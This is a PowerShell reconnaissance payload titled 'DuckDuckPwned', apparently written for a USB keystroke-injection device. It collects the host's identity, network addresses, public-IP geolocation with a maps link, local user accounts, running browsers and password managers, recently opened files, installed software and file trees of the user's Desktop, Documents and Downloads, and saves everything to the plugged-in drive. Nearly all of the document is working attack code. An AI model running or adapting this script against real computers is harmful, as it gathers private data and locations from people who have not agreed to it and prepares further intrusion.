param([string]$DuckyDrive)

# ============================================================
#   DuckDuckPwned.ps1
#   Recon Combo: System Info + Geolocation + File Tree
#   Output: saved directly to the ducky drive
# ============================================================

$out = "$DuckyDrive\DuckDuckPwned.txt"
$line = "=" * 52

function Section($title) {
    "`n$line`n  $title`n$line" | Out-File $out -Append
}

# Header
@"
$line
    ██████╗ ██╗   ██╗ ██████╗██╗  ██╗
    ██╔══██╗██║   ██║██╔════╝██║ ██╔╝
    ██║  ██║██║   ██║██║     █████╔╝ 
    ██║  ██║██║   ██║██║     ██╔═██╗ 
    ██████╔╝╚██████╔╝╚██████╗██║  ██╗
    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝
         DuckDuckPwned — Recon Report
    Collected: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
$line
"@ | Out-File $out

# ── SECTION 1: SYSTEM INFO ──────────────────────────────────
Section "SYSTEM INFO"

$os  = Get-WmiObject Win32_OperatingSystem
$cpu = Get-WmiObject Win32_Processor
$cs  = Get-WmiObject Win32_ComputerSystem
$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)

@"
  Hostname   : $env:COMPUTERNAME
  User       : $env:USERNAME
  Domain     : $env:USERDOMAIN
  OS         : $($os.Caption) (Build $($os.BuildNumber))
  Uptime     : $($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m
  CPU        : $($cpu.Name.Trim())
  RAM        : $([math]::Round($cs.TotalPhysicalMemory/1GB, 2)) GB
  System Dir : $($os.SystemDirectory)
"@ | Out-File $out -Append

# ── SECTION 2: NETWORK INFO ─────────────────────────────────
Section "NETWORK INFO"

Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -ne "127.0.0.1" } |
    Select-Object InterfaceAlias, IPAddress, PrefixLength |
    Format-Table -AutoSize |
    Out-String |
    Out-File $out -Append

# ── SECTION 3: GEOLOCATION (We Found You) ───────────────────
Section "LOCATION + PUBLIC IP"

try {
    $geo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -TimeoutSec 5
    @"
  Public IP  : $($geo.ip)
  City       : $($geo.city)
  Region     : $($geo.region)
  Country    : $($geo.country)
  ISP        : $($geo.org)
  Coords     : $($geo.loc)
  Maps Link  : https://maps.google.com/?q=$($geo.loc)
"@ | Out-File $out -Append
} catch {
    "  [!] No internet access — geolocation skipped" | Out-File $out -Append
}

# ── SECTION 4: LOCAL USERS ──────────────────────────────────
Section "LOCAL USERS"

Get-LocalUser |
    Select-Object Name, Enabled, LastLogon, PasswordRequired |
    Format-Table -AutoSize |
    Out-String |
    Out-File $out -Append

# ── SECTION 5: RUNNING PROCESSES (interesting ones) ─────────
Section "NOTABLE RUNNING PROCESSES"

$watchlist = @("chrome","firefox","edge","outlook","teams",
               "slack","zoom","discord","keepass","1password",
               "bitwarden","code","powershell","cmd","python")

Get-Process |
    Where-Object { $watchlist -contains $_.Name.ToLower() } |
    Select-Object Name, Id, CPU, @{N="RAM(MB)";E={[math]::Round($_.WorkingSet/1MB,1)}} |
    Format-Table -AutoSize |
    Out-String |
    Out-File $out -Append

# ── SECTION 6: RECENTLY ACCESSED FILES ──────────────────────
Section "RECENTLY ACCESSED FILES (Last 20)"

Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 20 Name, LastWriteTime |
    Format-Table -AutoSize |
    Out-String |
    Out-File $out -Append

# ── SECTION 7: INSTALLED SOFTWARE ───────────────────────────
Section "INSTALLED SOFTWARE (Top 30)"

Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" `
    -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayName } |
    Select-Object DisplayName, DisplayVersion, Publisher |
    Sort-Object DisplayName |
    Select-Object -First 30 |
    Format-Table -AutoSize |
    Out-String |
    Out-File $out -Append

# ── SECTION 8: TREE OF KNOWLEDGE (File Map) ─────────────────
Section "FILE SYSTEM TREE"

foreach ($folder in @("Desktop", "Documents", "Downloads")) {
    $path = "$env:USERPROFILE\$folder"
    "`n  -- $folder --" | Out-File $out -Append
    if (Test-Path $path) {
        cmd /c "tree `"$path`" /F 2>nul" | Out-File $out -Append
    } else {
        "  [not found]" | Out-File $out -Append
    }
}

# ── FOOTER ──────────────────────────────────────────────────
@"

$line
  Quack. Report saved to: $out
$line
"@ | Out-File $out -Append

# Open the report on screen when done
Start-Process notepad $out